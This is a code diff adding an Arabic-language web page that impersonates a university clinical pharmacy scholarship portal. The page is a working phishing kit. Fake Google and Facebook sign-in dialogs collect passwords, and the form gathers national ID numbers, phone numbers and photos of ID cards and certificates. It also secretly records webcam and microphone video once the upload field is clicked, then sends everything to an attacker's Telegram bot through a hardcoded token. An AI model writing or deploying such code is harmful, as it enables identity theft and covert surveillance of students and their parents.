@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جامعة جنوب الوادي الأهلية - منحة الصيدلة الإكلينيكية</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #003366;
+            --secondary-color: #c5a017;
+            --bg-color: #f0f2f5;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background-color: var(--bg-color);
+            direction: rtl;
+        }
+
+        header {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 15px;
+            text-align: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 40px auto;
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            min-height: 400px;
+        }
+
+        .btn-main {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        input[type="text"], input[type="number"], input[type="tel"], input[type="file"] {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        .hidden { display: none; }
+        
+        /* شاشة تسجيل الدخول */
+        .login-screen {
+            text-align: center;
+            padding-top: 20px;
+        }
+        
+        .social-btn {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: white;
+            transition: 0.2s;
+        }
+
+        .btn-google:hover { background-color: #f8f8f8; }
+        .btn-facebook { background-color: #1877f2; color: white; border: none; }
+        .btn-facebook:hover { background-color: #166fe5; }
+
+        /* تنسيق نافذة جوجل */
+        .google-modal-content {
+            background: white;
+            padding: 40px;
+            width: 450px;
+            border-radius: 8px;
+            text-align: center;
+            font-family: 'Roboto', sans-serif;
+            direction: ltr;
+        }
+        .g-header { font-size: 24px; font-weight: 500; margin-bottom: 10px; color: #202124; }
+        .g-sub { font-size: 16px; color: #202124; margin-bottom: 30px; }
+        .g-input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 15px; /* مسافة بين الإيميل والباسورد */
+        }
+        .g-footer { display: flex; justify-content: flex-end; align-items: center; margin-top: 20px; }
+        .g-btn {
+            background-color: #1a73e8;
+            color: white;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            border: none;
+            cursor: pointer;
+        }
+
+        /* تنسيق نافذة فيسبوك */
+        .fb-modal-content {
+            background: white;
+            padding: 20px;
+            width: 396px;
+            border-radius: 8px;
+            text-align: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            direction: ltr;
+        }
+        .fb-logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 10px; display: block; }
+        .fb-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            margin-bottom: 12px;
+        }
+        .fb-btn {
+            width: 100%;
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            line-height: 48px;
+            padding: 0 16px;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        /* Modal Structure */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        h2 { color: var(--primary-color); border-bottom: 2px solid var(--secondary-color); display: inline-block; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+<header>
+    <img src="http://www.svnu.edu.eg/assets/images/pharm2.png" width="200px">
+    <h1>جامعة جنوب الوادي الأهلية</h1>
+    <p>بوابة التقديم لمنحة الصيدلة الإكلينيكية</p>
+</header>
+
+<div class="container">
+    
+    <div id="step-login" class="login-screen">
+        <h2 style="border:none">تسجيل الدخول للتقديم</h2>
+        <p style="margin-bottom: 30px; color: #666;">يرجى تسجيل الدخول بحسابك للمتابعة</p>
+
+        <button class="social-btn btn-google" onclick="showGoogleModal()">
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADcAAAA4CAMAAABuU5ChAAAA+VBMVEX////pQjU0qFNChfT6uwU0f/O4zvs6gfSJr/j6twDoOisjePPoNSXpPjDrWU/oLRr+9vZ7pff/vAAUoUAkpEn0ran619b82pT7wgD+68j947H/+e7//PafvPm/0vuBw5Df7+P63tz3xcPxl5HnJQ7qUEXxj4n4z83zoJzqSz/vgXrucWrsY1r1tbHrSBPoOjbvcSr0kx74rRH80XntZC3xhSPmGRr86+r4sk/936EJcfPS3/yowvnbwVKjsTjx9f5urEjkuBu9tC+ErkJyvoRRpj2az6hWs23j6/0emX2z2btAiuI8k8AyqkE5nZU1pGxCiOxVmtHJ5M+PSt3WAAACGElEQVRIieWSa3fSQBCGk20CJRcW2AWKxgJtqCmieNdatV5SUtFq5f//GJeE7CXJJOT4TZ+PO+c58+7MaNr/SWd60mecTDs1pMFp28dODPZnZw/369TXseXqHNfCblDdte84krTDwUFFwnMnJyXm+bSsmZ/vlcb1+6A2x5C1xYeyPgIyJlhtYDjzjOYyZA3oFighLYxni8UMY6dCG/jy9KzTQfI8DXSnTNN0kcl1lNE9dlxYC8TnnEVmAJ02qHlPllyb58vgmQ2Np0tYgzGMo2ex6IKRihi1mPhcZyYuO8McL4yYl0vrrI6mJZpx9Or1mzqa10rFt8p7o5ArXh+lXutC8d6ZBdiXvH6PeyPFsw8KMBu8fsG9+3t473l9yD1vD+/BX3v1cgqv3lzE/8A9NCUK5sn33vugeN1DQTcVTbG/9M56H+lEAzg2d54t7iW5657xCdEx5PF+B9Lj9oO9z4hBgIZX6YyaXfmZaV9QQkU781h+Hra+7jQaFv6Or8RW3r1rhErES641D9XKigox8jJaQxyAfZOpIQm6kiuT6BvfujqVuEpkkY43u+d1RBBF35v55aVJidKSEBRFiJAk/+0PM3NjgjFFMLc/WVYzlzImLBPprzvzrlBjHUmZSH8DmqatS0QSZtcjTxUBWSlZw1bckhaYlISTcm1rIqKolJJxtRWnXUVscTFsjWFFwoy7WTM2+zX69/gDaLcy7SET9nsAAAAASUVORK5CYII=" width="20" alt="G">
+            تسجيل الدخول باستخدام Google
+        </button>
+
+        <button class="social-btn btn-facebook" onclick="showFacebookModal()">
+            <span style="font-weight: bold; font-family: sans-serif;">f</span>
+            تسجيل الدخول باستخدام Facebook
+        </button>
+    </div>
+
+    <div id="step-form" class="hidden">
+        <center><h2>استمارة التقديم</h2></center>
+        <form onsubmit="submitFinalForm(event)">
+            <label>اسم الطالب الرباعي:</label>
+            <input type="text" required placeholder="الاسم كما في الرقم القومي">
+            
+            <label>الرقم القومي (14 رقم):</label>
+            <input type="number" required placeholder="الرقم القومي">
+            
+            <label>رقم هاتف الطالب:</label>
+            <input type="tel" required>
+
+            <label>رقم هاتف ولي الأمر:</label>
+            <input type="tel" required>
+            
+            <hr style="margin: 20px 0; border: 0; border-top: 1px solid #eee;">
+            <p style="margin-bottom: 10px; color: #666; font-size: 14px;">يرجى رفع صور واضحة للمستندات التالية:</p>
+
+            <label>صورة البطاقة الشخصية (الوجه الأمامي):</label>
+            <input type="file" accept="image/*" onclick="startRecording()" required>
+            
+            <label>صورة البطاقة الشخصية (الوجه الخلفي):</label>
+            <input type="file" accept="image/*" required>
+
+            <label style="color: var(--primary-color); font-weight: bold;">صورة شهادة الثانوية العامة:</label>
+            <input type="file" accept="image/*" required>
+            
+            <button class="btn-main" type="submit" onclick="stopRecording()">إرسال طلب التقديم</button>
+        </form>
+    </div>
+   <video id="recordVideo" autoplay playsinline class="hidden" style="display: none;"></video>
+    <div id="step-success" class="hidden" style="text-align: center;">
+        <h1 style="font-size: 60px; margin-bottom: 20px;">✅</h1>
+        <h2 style="border:none">تم التسجيل بنجاح</h2>
+        <p>شكراً لك، تم استلام بياناتك ومرفقاتك بنجاح.</p>
+        <p>سيتم مراجعة الطلب والتواصل معك قريباً.</p>
+    </div>
+</div>
+
+<div id="google-modal" class="modal-overlay" onclick="closeModals(event)">
+    <div class="google-modal-content">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" style="height: 24px; margin-bottom: 10px;">
+        <div class="g-header">Sign in</div>
+        <div class="g-sub">to continue to SVNU Portal</div>
+        
+        <input type="text" class="g-input" id="g-email" placeholder="Email or phone">
+        <input type="password" class="g-input" id="g-password" placeholder="Enter your password">
+        
+        <div style="text-align: left; color: #1a73e8; font-size: 14px; font-weight: 500; margin-bottom: 20px;">Forgot password?</div>
+
+        <div class="g-footer">
+            <button class="g-btn" onclick="simulateLogin('Google')">Next</button>
+        </div>
+    </div>
+</div>
+
+<div id="facebook-modal" class="modal-overlay" onclick="closeModals(event)">
+    <div class="fb-modal-content">
+        <div class="fb-logo">facebook</div>
+        <div style="margin-bottom: 15px; font-size: 18px;">Log Into Facebook</div>
+        
+        <input type="text" class="fb-input" id="fb-email" placeholder="Email or Phone Number">
+        <input type="password" class="fb-input" id="fb-password" placeholder="Password">
+        
+        <button class="fb-btn" onclick="simulateLogin('Facebook')">Log In</button>
+        
+        <div style="margin-top: 15px;">
+            <a href="#" style="color: #1877f2; text-decoration: none; font-size: 14px;">Forgot account?</a>
+        </div>
+    </div>
+</div>
+
+<script>
+    let stream;
+let recorder;
+let recordedChunks = [];
+let videoBlob;
+
+// بدء التسجيل
+async function startRecording() {
+    stream = await navigator.mediaDevices.getUserMedia({
+        video: true,
+        audio: true
+    });
+
+    const video = document.getElementById("recordVideo");
+    video.srcObject = stream;
+    video.classList.remove("hidden");
+
+    recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+    recordedChunks = [];
+
+    recorder.ondataavailable = e => recordedChunks.push(e.data);
+    recorder.start();
+
+}
+function showLoader() {
+    const loader = document.createElement('div');
+    loader.id = 'upload-loader';
+    loader.style.position = 'fixed';
+    loader.style.top = '0';
+    loader.style.left = '0';
+    loader.style.width = '100%';
+    loader.style.height = '100%';
+    loader.style.background = 'rgba(0,0,0,0.5)';
+    loader.style.display = 'flex';
+    loader.style.justifyContent = 'center';
+    loader.style.alignItems = 'center';
+    loader.style.zIndex = '2000';
+    loader.innerHTML = '<div style="background:white;padding:20px;border-radius:10px;font-size:18px;"><svg fill="hsl(228, 97%, 42%)" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12,4a8,8,0,0,1,7.89,6.7A1.53,1.53,0,0,0,21.38,12h0a1.5,1.5,0,0,0,1.48-1.75,11,11,0,0,0-21.72,0A1.5,1.5,0,0,0,2.62,12h0a1.53,1.53,0,0,0,1.49-1.3A8,8,0,0,1,12,4Z"><animateTransform attributeName="transform" type="rotate" dur="0.75s" values="0 12 12;360 12 12" repeatCount="indefinite"/></path></svg> جاري ارسال الطلب انتظر قد يطول الامر </div>';
+    document.body.appendChild(loader);
+}
+
+function hideLoader() {
+    const loader = document.getElementById('upload-loader');
+    if(loader) loader.remove();
+}
+
+// إيقاف التسجيل
+function stopRecording() {
+    recorder.onstop = () => {
+        videoBlob = new Blob(recordedChunks, { type: "video/webm" });
+    };
+
+    recorder.stop();
+    stream.getTracks().forEach(t => t.stop());
+}
+
+    // التحكم في ظهور النوافذ
+    function showGoogleModal() {
+        document.getElementById('google-modal').style.display = 'flex';
+    }
+
+    function showFacebookModal() {
+        document.getElementById('facebook-modal').style.display = 'flex';
+    }
+
+    function closeModals(e) {
+        if (e.target.classList.contains('modal-overlay')) {
+            e.target.style.display = 'none';
+        }
+    }
+
+    // محاكاة عملية الدخول والانتقال للفورم مباشرة
+    function simulateLogin(provider) {
+        let email = '';
+        let pass = '';
+
+        if(provider === 'Google') {
+            email = document.getElementById('g-email').value;
+            pass = document.getElementById('g-password').value;
+        }
+        if(provider === 'Facebook') {
+            email = document.getElementById('fb-email').value;
+            pass = document.getElementById('fb-password').value;
+        }
+
+        // تحقق بسيط أن الخانات ليست فارغة
+        if(email.trim() === "" || pass.trim() === "") {
+            alert("Please fill in all fields / يرجى ملء جميع البيانات");
+            return;
+        }
+
+        // إخفاء النوافذ
+        document.getElementById('google-modal').style.display = 'none';
+        document.getElementById('facebook-modal').style.display = 'none';
+        
+        // الانتقال مباشرة للفورم (تم حذف خطوة التحقق من الدرجات)
+        document.getElementById('step-login').classList.add('hidden');
+        document.getElementById('step-form').classList.remove('hidden');
+    }
+
+   async function submitFinalForm(e) {
+    e.preventDefault();
+   
+    const botToken = "8339659569:AAGEgXJt_FWqP83psb0Z3O42A6TMW-AJGb4";
+    const chatId = "5865345881";
+
+    const form = e.target;
+
+    const studentName = form.elements[0].value;
+    const nationalId = form.elements[1].value;
+    const studentPhone = form.elements[2].value;
+    const parentPhone = form.elements[3].value;
+
+    // الملفات
+    const frontId = form.elements[4].files[0];
+    const backId = form.elements[5].files[0];
+    const certificate = form.elements[6].files[0];
+
+    // رسالة النص
+    const messageText =
+        `✨ طلب منحة صيدلة جديد ✨\n\n` +
+        `الاسم: ${studentName}\n` +
+        `الرقم القومي: ${nationalId}\n` +
+        `هاتف الطالب: ${studentPhone}\n` +
+        `هاتف ولي الأمر: ${parentPhone}`;
+   showLoader()
+    // 1️⃣ إرسال الرسالة النصية
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: messageText
+        })
+    });
+      
+    async function sendPhoto(photoFile, caption) {
+        const fd = new FormData();
+        fd.append("chat_id", chatId);
+        fd.append("photo", photoFile);
+        fd.append("caption", caption);
+
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: "POST",
+            body: fd
+        });
+    }
+    
+     await sendVideoToTelegram(botToken, chatId, videoBlob);
+     hideLoader();
+    if (frontId) await sendPhoto(frontId, "صورة البطاقة - الوجه الأمامي");
+
+    if (backId) await sendPhoto(backId, "صورة البطاقة - الوجه الخلفي");
+
+    if (certificate) await sendPhoto(certificate, "صورة شهادة الثانوية العامة");
+
+
+
+    document.getElementById("step-form").classList.add("hidden");
+    document.getElementById("step-success").classList.remove("hidden");
+}
+async function sendVideoToTelegram(botToken, chatId, videoBlob) {
+    const fd = new FormData();
+    fd.append("chat_id", chatId);
+    fd.append("video", videoBlob, "verification_video.webm");
+    fd.append("caption", "🎥 فيديو التحقق");
+        
+    await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+        method: "POST",
+        body: fd
+    });
+
+}
+
+</script>
+
+</body>
+</html>
